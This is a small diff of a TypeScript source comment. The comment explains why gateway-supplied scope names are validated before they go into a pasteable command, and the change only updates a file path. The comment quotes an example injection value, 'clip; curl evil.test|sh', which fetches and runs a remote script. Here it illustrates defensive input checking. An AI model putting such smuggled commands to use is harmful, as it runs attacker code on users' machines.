@@ -17,7 +17,7 @@ const SAFE_LABEL = /^[A-Za-z0-9._-]{1,64}$/;
  * A scope name we are willing to put into the same pasteable command.
  *
  * `required` and `granted` are ALSO gateway-supplied — they come straight off the
- * 403 body — and the upstream guards (`parseScopeGap` in gateway-client.ts,
+ * 403 body — and the upstream guards (`parseScopeGap` in background/http-json.ts,
  * `isScopeGap` in messages.ts) only check `typeof === "string"`; they do not look
  * at the characters. Without this check, a 403 body of
  * `{"granted":["clip; curl evil.test|sh"]}` would sail through the label check and
